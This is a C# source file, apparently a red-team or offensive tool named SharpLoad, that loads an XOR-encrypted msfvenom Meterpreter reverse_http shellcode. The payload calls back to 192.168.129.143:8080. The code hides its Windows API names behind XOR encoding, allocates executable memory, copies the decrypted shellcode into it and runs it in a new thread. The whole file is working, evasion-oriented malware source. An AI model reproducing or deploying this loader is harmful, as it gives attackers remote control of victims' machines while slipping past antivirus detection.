using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace SharpLoad
{
    [ComVisible(true)]
    public class Load
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr aaaaaaaaaaaa(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr bbbbbbbbbbbbb(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate UInt32 ccccccccccccccc(IntPtr hHandle, UInt32 dwMilliseconds);

        public Load()
        {

        }

        public static byte[] helloworld(byte[] e_buf, string key)
        {
            byte[] d_buf = new byte[e_buf.Length];
            byte[] key_bytes = Encoding.UTF8.GetBytes(key);

            for (int i =0; i < e_buf.Length; i++)
            {
                d_buf[i] = (byte)(e_buf[i] ^ key_bytes[i % key_bytes.Length]);
            }

            return d_buf;
        }


        public void Execute()
        {
            Console.WriteLine("Testowy napis");
            //msfvenom -p windows/x64/meterpreter/reverse_http --encrypt xor  --encrypt-key siemanko LHOST=192.168.129.143 LPORT=8080 -f csharp
            byte[] buf = new byte[563] {0x8f,0x21,0xe6,0x89,0x91,0x86,
0xa7,0x6f,0x73,0x69,0x24,0x3c,0x20,0x3e,0x39,0x27,0x42,0xbb,
0x00,0x25,0xea,0x3c,0x0b,0x3e,0x25,0x21,0xee,0x3f,0x79,0x26,
0xe0,0x3d,0x53,0x21,0x6a,0xda,0x2b,0x24,0x23,0xe4,0x01,0x39,
0x28,0x5c,0xa8,0x26,0x5a,0xaf,0xdf,0x55,0x04,0x11,0x63,0x42,
0x4b,0x2e,0xb2,0xa0,0x68,0x2c,0x60,0xaf,0x89,0x82,0x21,0x28,
0x34,0x25,0xea,0x3c,0x4b,0xe4,0x31,0x55,0x2d,0x6c,0xb1,0x08,
0xea,0x17,0x6b,0x62,0x67,0x62,0xe4,0x1c,0x6b,0x6f,0x73,0xe2,
0xe5,0xe5,0x61,0x6e,0x6b,0x27,0xf6,0xa9,0x11,0x0a,0x29,0x6f,
0xbb,0xe4,0x3b,0x71,0x21,0xe6,0x21,0x4e,0x22,0x6e,0xa3,0x39,
0x86,0x3b,0x29,0x91,0xa2,0x2e,0xf8,0x5d,0xed,0x25,0x60,0xb8,
0x26,0x5e,0xba,0x21,0x54,0xad,0xcd,0x2f,0xaa,0xa6,0x7e,0x28,
0x64,0xac,0x59,0x8e,0x1e,0x9e,0x3f,0x6a,0x29,0x49,0x69,0x2b,
0x52,0xbe,0x06,0xb1,0x3d,0x29,0xea,0x2e,0x4f,0x26,0x72,0xb9,
0x03,0x2c,0xea,0x62,0x23,0x2b,0xf8,0x29,0x79,0x24,0x60,0xbe,
0x2a,0xe4,0x77,0xe1,0x2d,0x6c,0xb1,0x2f,0x33,0x2e,0x2b,0x37,
0x3c,0x37,0x20,0x36,0x2a,0x36,0x32,0x33,0x2d,0xee,0x8d,0x4e,
0x2a,0x3d,0x8c,0x89,0x3d,0x2c,0x38,0x34,0x23,0xe4,0x61,0x80,
0x2e,0x92,0x9e,0x91,0x36,0x27,0x42,0xb2,0x36,0x24,0xdf,0x19,
0x02,0x01,0x1a,0x07,0x00,0x19,0x61,0x2f,0x3d,0x27,0xfa,0x88,
0x2c,0xaa,0xa3,0x22,0x1c,0x49,0x74,0x96,0xb0,0x3e,0x32,0x26,
0xe2,0x8e,0x20,0x33,0x28,0x5c,0xa1,0x23,0x5a,0xa6,0x20,0x3a,
0x2c,0xd7,0x5b,0x38,0x12,0xc8,0x73,0x69,0x65,0x6d,0x9e,0xbb,
0x83,0x7f,0x73,0x69,0x65,0x5c,0x58,0x5c,0x45,0x5e,0x45,0x51,
0x4b,0x5c,0x53,0x57,0x45,0x5e,0x47,0x5a,0x65,0x37,0x29,0xe7,
0xaa,0x26,0xb4,0xa9,0xf5,0x72,0x61,0x6e,0x26,0x5e,0xba,0x3a,
0x36,0x07,0x62,0x3d,0x22,0xd5,0x24,0xe0,0xfa,0xab,0x61,0x6e,
0x6b,0x6f,0x8c,0xbc,0x8d,0x47,0x61,0x6e,0x6b,0x40,0x0a,0x5d,
0x23,0x04,0x11,0x24,0x31,0x1a,0x43,0x33,0x37,0x3a,0x04,0x28,
0x0f,0x59,0x3e,0x11,0x2d,0x0a,0x59,0x2f,0x59,0x2c,0x1b,0x0e,
0x07,0x1b,0x0c,0x29,0x5b,0x17,0x11,0x3d,0x2c,0x3e,0x55,0x2b,
0x3c,0x17,0x73,0x21,0xec,0xac,0x32,0x34,0x2a,0x37,0x3e,0x58,
0xac,0x3e,0x29,0xd6,0x6b,0x6d,0x5b,0xed,0x65,0x6d,0x61,0x6e,
0x3b,0x3c,0x20,0x20,0xa2,0xaf,0x8a,0x3b,0x45,0x54,0x8c,0xbc,
0x2d,0xe4,0xa7,0x04,0x61,0x30,0x20,0x33,0x2d,0xe4,0x90,0x23,
0x5a,0xa6,0x3e,0x58,0xac,0x3e,0x32,0x27,0xac,0xad,0x5e,0x6f,
0x7d,0x16,0x9e,0xbb,0xee,0xaf,0x06,0x76,0x2d,0xaa,0xa0,0xe6,
0x78,0x6f,0x73,0x20,0xdf,0x29,0x91,0x5b,0x8b,0x6f,0x73,0x69,
0x65,0x92,0xb4,0x26,0x94,0xa0,0x07,0x6b,0x8e,0xa1,0x89,0x3b,
0x6b,0x6f,0x73,0x3a,0x3c,0x07,0x21,0x34,0x22,0xe6,0xa2,0xa8,
0x87,0x7d,0x28,0xa9,0xab,0x6f,0x63,0x69,0x65,0x24,0xdb,0x36,
0xcf,0x3c,0x96,0x69,0x65,0x6d,0x61,0x91,0xbe,0x27,0xe0,0x3a,
0x36,0x25,0xe8,0x89,0x23,0xe6,0x82,0x21,0xec,0xb7,0x28,0xa9,
0xab,0x6f,0x53,0x69,0x65,0x24,0xe8,0x97,0x22,0xd5,0x61,0xff,
0xec,0x8f,0x61,0x6e,0x6b,0x6f,0x8c,0xbc,0x2d,0xee,0xa5,0x4e,
0xee,0xaf,0x07,0xdb,0x03,0xe6,0x66,0x26,0x6a,0xac,0xf6,0xa9,
0x10,0xbf,0x39,0xad,0x33,0x05,0x73,0x30,0x2c,0xaa,0xa3,0x9e,
0xde,0xcd,0x25,0x96,0xb0};


            // Xor payload with one byte key
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            //}



            byte[] d_buf = helloworld(buf, "siemanko");


            byte[] e_dl = { 0x91, 0x9f, 0x88, 0x94, 0x9f, 0x96, 0xc9, 0xc8, 0xd4, 0x9e, 0x96, 0x96 };
            byte[] d_dl = new byte[12];
            for (int i = 0; i < e_dl.Length; i++)
            {
                d_dl[i] = (byte)((uint)e_dl[i] ^ 0xfa);
            }
            var v1 = Encoding.Default.GetString(d_dl);
            string dname2 = v1;

            IntPtr hModule2 = LoadLibrary(dname2);
            byte[] e_va = { 0xac, 0x93, 0x88, 0x8e, 0x8f, 0x9b, 0x96, 0xbb, 0x96, 0x96, 0x95, 0x99 };
            byte[] d_va = new byte[12];
            for (int i = 0; i < e_va.Length; i++)
            {
                d_va[i] = (byte)((uint)e_va[i] ^ 0xfa);
            }
            var v2 = Encoding.Default.GetString(d_va);
            byte[] e_ct = { 0xb9, 0x88, 0x9f, 0x9b, 0x8e, 0x9f, 0xae, 0x92, 0x88, 0x9f, 0x9b, 0x9e };
            byte[] d_ct = new byte[12];
            for (int i = 0; i < e_ct.Length; i++)
            {
                d_ct[i] = (byte)((uint)e_ct[i] ^ 0xfa);
            }
            var v3 = Encoding.Default.GetString(d_ct);
            byte[] e_wf = { 0xad, 0x9b, 0x93, 0x8e, 0xbc, 0x95, 0x88, 0xa9, 0x93, 0x94, 0x9d, 0x96, 0x9f, 0xb5, 0x98, 0x90, 0x9f, 0x99, 0x8e };
            byte[] d_wf = new byte[19];
            for (int i = 0; i < e_wf.Length; i++)
            {
                d_wf[i] = (byte)((uint)e_wf[i] ^ 0xfa);
            }
            var v4 = Encoding.Default.GetString(d_wf);
            IntPtr intPtr2 = GetProcAddress(hModule2, (string)v2);
            aaaaaaaaaaaa va = (aaaaaaaaaaaa)Marshal.GetDelegateForFunctionPointer(intPtr2, typeof(aaaaaaaaaaaa));
            IntPtr addr = va(IntPtr.Zero, 0x7000, 0x3000, 0x40);
            int size = d_buf.Length;
            Marshal.Copy(d_buf, 0, addr, size);
            IntPtr intPtr3 = GetProcAddress(hModule2, (string)v3);
            bbbbbbbbbbbbb cr = (bbbbbbbbbbbbb)Marshal.GetDelegateForFunctionPointer(intPtr3, typeof(bbbbbbbbbbbbb));
            IntPtr hThread = cr(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            IntPtr intPtr4 = GetProcAddress(hModule2, (string)v4);
            ccccccccccccccc wf = (ccccccccccccccc)Marshal.GetDelegateForFunctionPointer(intPtr4, typeof(ccccccccccccccc));
            wf(hThread, 0xFFFFFFFF);
        }

        public static void Main()
        {
            
            Load obiekt = new Load();
            obiekt.Execute();

            string userName = Console.ReadLine();
        }
    }
}
